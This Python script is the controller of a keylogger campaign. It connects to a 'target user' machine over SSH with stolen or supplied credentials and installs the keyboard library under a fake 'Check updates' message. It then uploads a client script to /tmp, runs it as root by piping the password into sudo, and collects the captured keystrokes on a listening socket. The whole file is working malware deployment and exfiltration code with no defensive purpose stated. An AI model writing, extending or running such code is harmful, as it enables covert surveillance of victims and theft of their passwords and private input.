import socket
import threading
import paramiko

class Sendler:
    def __init__(self, serv_addr, serv_port, addr, name, password):
        self.__addr = addr
        self.__login = name
        self.__pass = password
        self.__filename = 'client.py'
        self.__remotepath = '/tmp/' + self.__filename
        self.__saddr = str(serv_addr)
        self.__sport = str(serv_port)
        
        self.__client = paramiko.SSHClient()
        self.__client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    def run_send(self):
        if not self.get_connection():
            self.check_updates()
            if not self.get_command():
                print('Done!')
            
        self.close()
        
    def check_updates(self):
        try:
            print('Check updates..')
            self.__client.exec_command('pip install keyboard')
            self.__client.exec_command('pip3 install keyboard')
            print('Updated!')
        except:
            print('Error with updates')
    
    def get_connection(self):
        print('Try to connect', self.__addr)
        try:
            self.__client.connect(hostname=self.__addr, port=22, username=self.__login, password=self.__pass)
            print('Connected to', self.__addr)
            return 0
        except:
            print('Connection refused', self.__addr)
            self.close()
            return 1
    
    def get_command(self):
        command = 'echo ' + self.__pass + ' ' + '| ' + 'sudo -S python3 ' + self.__remotepath + ' ' + self.__saddr + ' ' + self.__sport 
        sftp = self.__client.open_sftp()
        print('Try to put')
        try:
            sftp.put(self.__filename, self.__remotepath)
            i,o,e = self.__client.exec_command(command)
            print(o.read())
            sftp.close()
            return 0
        except:
            sftp.close()
            print('Error put')
            return self.close()
        
    def close(self):
        self.__client.close()
        print('Closed')
        return 2

class Server:
    def __init__(self, address, port):
        self.__addr = str(address)
        self.__port = int(port)
    
    def getkey(self, sock, addr, ser):
        print('Получено соединение', addr)
        try:
            while True:
                data = sock.recv(4096)
                if data:
                    print(addr, data)
        except:
            sock.close()
            
        sock.close()
    
    def __create_client(self, addr, name, password):
        sn = Sendler(self.__addr, self.__port, addr, name, password)
        sn.run_send()
    
    def open_server(self, pull):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((self.__addr, self.__port))
        print('Start')
        server.listen()
        
        for h_addr, h_name, h_pass in pull:
            th = threading.Thread(target=(self.__create_client), args=(h_addr, h_name, h_pass))
            th.start()
        
        object_list = []
        try:    
            while True:
                obj = self.Connection(server.accept())
                object_list.append(obj)
                th = threading.Thread(target=(self.getkey), args=(obj.conn, obj.addr, server,))
                th.start()
        except:
            for o in object_list:
                o.close_connection()
                print('Off')
            server.close()
        
        server.close()  

    class Connection:
        def __init__(self, accept):
            self.conn = accept[0]
            self.addr = accept[1]
        
        def close_connection(self):
            self.conn.close()

SERVER_ADDRESS = "XXX.XXX.XXX.XXX"
SERVER_PORT = 0000

TARGET_USER_ADDRESS = "XXX.XXX.XXX.XXX"
TARGET_USER_LOGIN = "XXXX"
TARGET_USER_PASSWORD = "XXXX"

ser = Server(SERVER_ADDRESS, SERVER_PORT)
ser.open_server([(TARGET_USER_ADDRESS, TARGET_USER_LOGIN, TARGET_USER_PASSWORD)])














